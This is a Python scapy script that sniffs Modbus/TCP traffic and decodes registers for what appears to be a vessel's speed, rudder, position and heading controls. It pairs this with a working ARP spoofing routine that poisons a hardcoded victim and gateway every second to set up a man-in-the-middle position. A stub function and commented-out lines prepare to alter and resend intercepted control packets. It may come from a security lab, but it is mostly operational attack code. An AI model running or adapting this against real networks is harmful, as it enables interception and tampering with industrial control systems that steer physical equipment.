import scapy.all as scapy 
import threading
from scapy.packet import Packet
from scapy.fields import ShortField, ByteField, FieldListField
from scapy.layers.inet import TCP
from scapy.all import bind_layers
from scapy.all import rdpcap
from scapy.contrib.modbus import *
 
class packet_sniffing:

    def modify(pkt):
        if (not pkt.haslayer(ModbusADURequest) and not pkt.haslayer(ModbusADUResponse)):
            return "Not Modbus Layer"
        modbus_layer = pkt.getlayer(ModbusADURequest) or pkt.getlayer(ModbusADUResponse)

        # Response: speed & rudder: alter this
        if pkt.haslayer(ModbusADUResponse) and getattr(modbus_layer, "funcCode", "?") == 3:
            return pkt
        if pkt.haslayer(ModbusADUResponse) and getattr(modbus_layer, "funcCode", "?") == 6:
            return pkt
        # Position data: alter based on register addr
        if getattr(modbus_layer, "funcCode", "?") == 6:
            return pkt
        

    def get_packet_info(pkt):
        
        pkt_info = dict()

        pkt_info["summary"] = pkt.summary()

        # Modbus should be request or response
        if (not pkt.haslayer(ModbusADURequest) and not pkt.haslayer(ModbusADUResponse)):
            return "Not Modbus Layer"
        
        # Set layer to whatever returns
        modbus_layer = pkt.getlayer(ModbusADURequest) or pkt.getlayer(ModbusADUResponse)

        # request or response
        type = "Request" if pkt.haslayer(ModbusADURequest) else ("Response" if pkt.haslayer(ModbusADUResponse) else "Modbus")

        # transaction ID
        trans_id = getattr(modbus_layer, "transId", "?")

        # function code
        func_meanings = {
            1: "Read Coils",
            2: "Read Discrete Inputs",
            3: "Read Holding Registers",
            4: "Read Input Registers",
            5: "Write Single Coil",
            6: "Write Single Register",
            15: "Write Multiple Coils",
            16: "Write Multiple Registers"
        }
        func_code = getattr(modbus_layer, "funcCode", "?")
        func_name = func_meanings[func_code]

        payload = getattr(modbus_layer, "payload", "?")

        # Change info based on func code
        def get_register_string(func_code, payload, scannable=False):
    
        # Default string
            register_string = "No info"
            scan_string = [" "*6," "*6," "*6," "*6," "*6,"X\tY\tTheta\tSpeed\tRudder"]
            # x y theta rudder dir

            register_meanings = {
                3: "Speed Feedback",    # 12-bit count (X/4095)*5.0
                4: "Rudder Feedback",   # 12-bit count (X/4095)*30
                10: "X Position",       # meters*100
                11: "Y Position",       # meters*100
                12: "Theta (Heading)"   # milli-radians
            }
            if func_code == 6:
                register_addr = getattr(payload, "registerAddr", "?")
                register_value = getattr(payload, "registerValue", "?")
                register_name = register_meanings[register_addr]
                register_string = f"{register_name} = {register_value}"
                # Theta (Heading) = 3142
                if register_addr == 10:
                    scan_string[0] = f"{register_value:>6}"
                if register_addr == 11:
                    scan_string[1] = f"{register_value:>6}"
                if register_addr == 12:
                    scan_string[2] = f"{register_value:>6}"

            elif func_code == 3 and type == "Request":
                start_addr = getattr(payload, "startAddr", "?")
                quantity = getattr(payload, "quantity", "?")    # Note: quantity is always and forever 2
                i = 1
                register_string = register_meanings[start_addr]
                while i <= quantity - 1:
                    register_string += ", " + register_meanings[start_addr + i]
                    i += 1
                # X Position, Y Position

            elif func_code == 3 and type == "Response":
                # Using straight registerVal is touchy.
                register_val = getattr(payload, "registerVal", "?")
                # if len(register_val) == 2:
                    # We got the expected 2 register values
                register_string = register_val

                scan_string[3] = f"{register_val[0]:>6}"
                scan_string[4] = f"{register_val[1]:>6}"

                # else:
                #     modbus_layer.show()

                #     # We got the bad 4 register values and need to go manually
                #     raw_bytes = getattr(payload, "load", "?")  # or payload[Raw].load if needed
                #     pdu = raw_bytes[7:]              # skip MBAP header
                #     func_code = pdu[0]
                #     byte_count = pdu[1]

                #     register_bytes = pdu[2:2+byte_count]  # slice exactly the number of bytes reported
                #     register_string = [int.from_bytes(register_bytes[i:i+2], "big") for i in range(0, len(register_bytes), 2)]

                # modbus_layer.show()
            if scannable:
                return scan_string
            return register_string
        register_string = get_register_string(func_code, payload)
        scan_numbers = get_register_string(func_code, payload, True)

        # Set info members: modbus_summary, modbus_layer, type, trans_id, func_code, 
        # func_name, payload, register_summary
        pkt_info["modbus_summary"] = f"{type} {trans_id}: {func_name}: {register_string}"
        pkt_info["modbus_layer"] = modbus_layer
        pkt_info["type"] = type
        pkt_info["trans_id"] = trans_id
        pkt_info["func_code"] = func_code
        pkt_info["func_name"] = func_name
        pkt_info["payload"] = payload
        pkt_info["register_summary"] = register_string
        pkt_info["scan_numbers"] = scan_numbers

        return pkt_info


    # def dstart():
    #     # Create Modbus format
    #     class Modbus(Packet):
    #         name = "Modbus"
    #         fields_desc = [
    #             ShortField("Transaction_ID", 0),
    #             ShortField("Protocol_ID", 0),
    #             ShortField("Length", 0),
    #             ByteField("Unit_ID", 0),
    #             ByteField("Function_Code", 0),
    #             FieldListField("Data", None, ByteField("", 0),
    #                         length_from=lambda pkt: pkt.Length - 2)
    #         ]
    #     # Show Modbus info layer
    #     bind_layers(TCP, Modbus, dport=502)
    #     bind_layers(TCP, Modbus, sport=502)

    #     def handle_packet(pkt): # -----------------------------------------------------------------------------------------------Flag
    #         # Filter for modbus
    #         if not (pkt.haslayer(ModbusADURequest) or pkt.haslayer(ModbusADUResponse)):
    #             print("not modbus layer")
    #             return False
    #         pkt.show()
    #         # print(packet_sniffing.get_packet_info(pkt))

    #     scapy.sniff(prn=handle_packet, store=False)
    
    def start():
        def handle_packet(pkt):
            # Modbus/TCP runs over TCP port 502
            if pkt.haslayer(TCP) and (pkt[TCP].sport == 502 or pkt[TCP].dport == 502):
                if (pkt.haslayer(ModbusADURequest) or pkt.haslayer(ModbusADUResponse)):
                    print(packet_sniffing.get_packet_info(pkt)["scan_numbers"]) #Scannable numbers in order: X Y Theta Speed Rudder
                    # print(packet_sniffing.get_packet_info(pkt)["modbus_summary"]) # Detailed lines
                    # pkt[scapy.IP].ttl -= 1
                    # del pkt[scapy.IP].chksum
                    # del pkt[scapy.TCP].chksum

                    # pkt = packet_sniffing.modify(pkt)

                    # scapy.send(pkt, verbose=False)
                else:
                    print("not modbus")
                    # pkt[ModbusADUResponse].show()


        # Sniff live traffic (adjust iface if needed)
        scapy.sniff(
            filter="tcp port 502",
            prn=handle_packet,
            store=False
        )

class arp_spoofing:

    def get_mac1(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/ arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbos = False)[0]
        return answered_list[0][1].hwsrc

    def get_mac(ip):
        '''return MAC address of any device connected to the network
        If ip is down return None'''
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/ arp_request
        answered_list, _ = scapy.srp(arp_request_broadcast, timeout=5)
        if answered_list:
            return answered_list[0][1].src


    def spoof(target_ip, spoof_ip, verbose=True):
        '''
        Spoofs 'target_ip' saying that we are host_ip'''

        packet = scapy.ARP(op='is-at', pdst=target_ip, hwdst = arp_spoofing.get_mac(target_ip), psrc = spoof_ip)
        # arp_spoofing.saved_packets.append(packet.summary())
        # print("PACKET PACKET YUP\n\n")
        # packet.show()
        # print("\n\nPACKET PACKET YUP")
        scapy.send(packet, verbose = False)
        if verbose:
            #get the MAC address of the default interface we are using
            self_mac = scapy.ARP().hwsrc  
            # print("[+] Sent to {} : {} is-at {}".format(target_ip, spoof_ip, self_mac))

    def restore(destination_ip, source_ip):
        destination_mac = arp_spoofing.get_mac(destination_ip)
        source_mac = arp_spoofing.get_mac(source_ip)
        packet = scapy.ARP(op = 2, pdst=destination_ip,
                hwdst = destination_mac,
                psrc = source_ip, hwsrc = source_mac)
        scapy.send(packet, verbose = False)



    def start():
        
        arp_spoofing.running = True

        # Initialize saved packets
        arp_spoofing.saved_packets = []
        
        #victom ip address
        arp_spoofing.target = '192.168.8.137'

        #gateway ip
        arp_spoofing.host = '192.168.8.243'

        arp_spoofing.verbose = True

        def interval():
            if arp_spoofing.running:
                #Telling the target that we are the host
                arp_spoofing.spoof(arp_spoofing.target, arp_spoofing.host, arp_spoofing.verbose)

                # Telling the host that we are the target
                arp_spoofing.spoof(arp_spoofing.host, arp_spoofing.target, arp_spoofing.verbose)

                # rerun in a second
                timer = threading.Timer(1.0, interval)
                timer.start()
        interval()
                
    def stop():

        print("[!] Detexcted CTRL+C! restoring the network, please wait")

        # print(arp_spoofing.saved_packets)

        arp_spoofing.running = False

        arp_spoofing.restore(arp_spoofing.target, arp_spoofing.host)
        arp_spoofing.restore(arp_spoofing.host, arp_spoofing.target)